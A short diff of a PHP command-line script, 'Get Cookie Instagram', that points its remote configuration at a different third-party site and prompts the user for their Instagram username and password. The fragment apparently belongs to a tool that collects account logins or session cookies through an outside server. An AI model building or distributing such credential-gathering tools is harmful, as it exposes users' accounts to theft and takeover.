@@ -1,9 +1,9 @@
 <?php
 error_reporting(0);
 $conf=array(
-            'me' => 'Get Cookie Instagram | http://www.indotagram.com',
-            'url' =>'http://www.indotagram.com/live',
-            'urlsubmit' => 'http://url'
+            'me' => 'Get Cookie Instagram | https://www.instamoment.xyz',
+            'url' =>'https://www.instamoment.xyz/sameel',
+            'urlsubmit' => 'https://url'
             );
  
 function Submit($url,$fields)
@@ -103,9 +103,9 @@ echo $WH.$conf['me'];
 echo "\n";  
 $data = Submit($conf['url'].'/data',0);
 $data = json_decode($data,true);
-echo"\n".$OG."Enter You Userame Instagram : ".$WH;
+echo"\n".$OG."Enter Your IG Username : ".$WH;
 $mu=trim(fgets(STDIN));
-echo"".$OG."Enter Your Password Instagram : ".$WH;
+echo"".$OG."Enter Your IG Password : ".$WH;
 $mp=trim(fgets(STDIN));
 echo "\n";
 $login = proccess(1, $data['ua'], 
